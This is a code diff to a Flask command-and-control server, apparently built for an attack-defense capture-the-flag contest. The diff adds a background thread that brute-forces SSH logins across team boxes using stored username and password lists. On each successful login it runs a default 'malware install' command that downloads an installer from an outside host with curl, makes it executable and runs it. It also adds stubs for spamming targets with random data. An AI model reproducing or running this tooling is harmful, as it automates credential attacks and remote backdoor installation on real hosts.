@@ -1,7 +1,13 @@
+import os
+import random
 import re
+import string
+import time
 from base64 import b64decode
 from datetime import datetime
+from threading import Thread
 
+import paramiko
 from flask import Flask, request, render_template, flash, redirect, url_for
 from flask_bootstrap import Bootstrap
 from flask_sqlalchemy import SQLAlchemy
@@ -17,9 +23,11 @@ LOG_FILE = "c2.log"
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
-DEFAULT_SSH_INTERVAL = "30"
-DEFAULT_SPAM_INTERVAL_MIN = "10"
-DEFAULT_SPAM_INTERVAL_MAX = "30"
+DEFAULT_MALWARE_INSTALL = "curl -o installer http://test.alberttaglieri.us/USSDelogrand/combat/backdoors/installer && chmod +x installer && ./installer"
+DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
+DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
+DEFAULT_SPAM_INTERVAL_MIN = "5"
+DEFAULT_SPAM_INTERVAL_MAX = "20"
 
 # Create Flask and database
 app = Flask(__name__, template_folder=TEMPLATE_DIR)
@@ -39,9 +47,19 @@ def main():
     add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                 "IPs, separated by commas and no spaces, that are allowed to access admin site")
     add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
-    add_setting("ssh_interval", DEFAULT_SSH_INTERVAL, "Seconds to wait between each SSH brute force")
+    add_setting("malware install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
+    add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
+                "Seconds to wait between each SSH bruteforce")
+    add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
+                "Seconds to wait for timeout during SSH bruteforce")
     add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
     add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
+
+    # Start threads
+    ssh_bruteforce_thread = Thread(target=ssh_bruteforce)
+    spam_thread = Thread(target=spam)
+    ssh_bruteforce_thread.start()
+    spam_thread.start()
 
     # Start Flask
     app.run(port=PORT, debug=DEBUG)
@@ -73,6 +91,11 @@ def admin_home():
                            flag_boxes=Box.query.filter_by(flags=True).count(),
                            flags_found=Flag.query.count(),
                            flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())
+
+
+@app.route("/admin/map", methods=["GET"])
+def admin_map():
+    return render_template("map.html")
 
 
 @app.route("/admin/settings", methods=["GET"])
@@ -116,7 +139,6 @@ def admin_logs():
         type = "all"
         logs = Log.query.order_by(Log.datetime.desc()).limit(num).all()
 
-    print(db.session.query(Log.type).distinct().all())
     return render_template("logs.html", logs=logs, selected_type=type,
                            types=db.session.query(Log.type).distinct().all()[0], num=num)
 
@@ -492,9 +514,6 @@ def admin_ssh_passwords_update():
     log("admin", f"SSH password {password} updated by {request.remote_addr}")
     return redirect(url_for("admin_ssh"))
 
-@app.route("/admin/map", methods=["GET"])
-def admin_map():
-    return render_template("map.html")
 
 # </editor-fold>
 
@@ -584,7 +603,79 @@ def update():
 
 # </editor-fold>
 
-# <editor-fold desc="Functions">
+# <editor-fold desc="Thread Functions">
+
+def ssh_bruteforce():
+    # Setup SSH client
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+
+    # Get settings from database
+    subnet = Setting.query.get("subnet").value
+    malware_install = Setting.query.get("malware_install").value
+    try:
+        interval = int(Setting.query.get("ssh_bruteforce_interval").value)
+    except:
+        log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
+        interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
+    try:
+        timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
+    except:
+        log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
+        timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT
+
+    # Continue trying
+    while True:
+
+        # Get boxes that are not pwned
+        boxes = Box.query.filter_by(pwned=False).all()
+
+        # Iterate over boxes
+        for box in boxes:
+
+            # Get box IP
+            ip = subnet.replace("T", box.team_num).replace("B", box.service_ip)
+
+            # Get SSH usernames and passwords
+            usernames = SSHUsername.query.all()
+            passwords = SSHPassword.query.all()
+
+            # Iterate over usernames and passwords
+            for username in usernames:
+                for password in passwords:
+                    log("ssh_bruteforce",
+                        f"trying {ip}:{box.ssh_port} with username {username} and password {password}")
+
+                    # Try to SSH
+                    try:
+                        client.connect(
+                            ip, port=box.ssh_port, username=username, password=password, timeout=timeout,
+                            banner_timeout=timeout, auth_timeout=timeout)
+                    except:
+                        log("ssh_bruteforce",
+                            f"failed to {ip}:{box.ssh_port} with username {username} and password {password}")
+                        continue
+                    log("ssh_bruteforce",
+                        f"success to {ip}:{box.ssh_port} with username {username} and password {password}")
+
+                    # Install malware
+                    ssh_cmd(client, malware_install)
+
+                    # Close the connection
+                    client.close()
+
+                    # Wait until next try
+                    log("ssh_bruteforce", f"sleeping for {interval} seconds")
+                    time.sleep(interval)
+
+
+def spam():
+    return
+
+
+# </editor-fold>
+
+# <editor-fold desc="Helper Functions">
 
 def half_subnet():
     parts = Setting.query.get("subnet").value.split(".")
@@ -619,6 +710,32 @@ def extract_flags(data, team_num, service_ip, source):
             db.session.commit()
             log("extract_flags",
                 f"flag {flag} successfully submitted from team {team_num} and service {service_ip} from {source}")
+
+
+def ssh_cmd(client, command):
+    log("ssh_bruteforce", f"running command '{command}'")
+    stdin, stdout, stderr = client.exec_command(command)
+    stdout = stdout.read().decode("utf-8")
+    stderr = stderr.read().decode("utf-8")
+    log("ssh_bruteforce", f"stdout: '{stdout}'")
+    log("ssh_bruteforce", f"stderr: '{stderr}'")
+    return stdout
+
+
+def random_string(strings):
+    result = ""
+    for _ in range(5, 10):
+        result += random.choice(strings) + "\n"
+    return result
+
+
+def random_characters():
+    letter = random.choice(string.ascii_letters)
+    return letter * random.randint(30, 150)
+
+
+def random_binary():
+    return os.urandom(random.randint(50, 200))
 
 
 def log(type, message):
